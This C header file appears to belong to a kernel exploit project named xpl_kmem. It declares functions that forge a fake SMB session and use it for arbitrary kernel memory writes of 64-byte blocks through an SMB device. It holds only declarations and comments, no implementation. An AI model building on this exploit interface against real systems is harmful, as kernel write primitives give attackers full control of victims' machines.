//
//  kmem_write_session.h
//  xpl_kmem
//
//  Created by sreejith on 2/25/22.
//

#ifndef kmem_write_session_h
#define kmem_write_session_h

#include <stdio.h>


typedef struct kmem_write_session* kmem_write_session_t;

/// Create a new fake smb_session for arbitary kernel memory write
/// @param smb_addr Socket address of the xpl_smbx server
kmem_write_session_t kmem_write_session_create(const struct sockaddr_in* smb_addr);

/// Writes data from `data` to `dst` kernel memory address
/// @param session The session created using `kmem_write_session_create` method
/// @param smb_dev File descriptor of the smb dev whose `smb_dev->sd_session = fake_session`
/// @param dst Address of destination kernel memory
/// @param data Data to be written to dst. Data must be of size 64 and last byte in data should be null byte
void kmem_write_session_write_block(kmem_write_session_t session, int smb_dev, uintptr_t dst, char data[MAXTHREADNAMESIZE]);

/// Returns the address of fake_session which can be used for arbitary kernel memory write
/// @param session The session created using `kmem_write_session_create` method
uintptr_t kmem_write_session_get_addr(kmem_write_session_t session);

/// Release resources
/// @param session_p Pointer to session created using `kmem_write_session_create` method
void kmem_write_session_destroy(kmem_write_session_t* session_p);

#endif /* kmem_write_session_h */
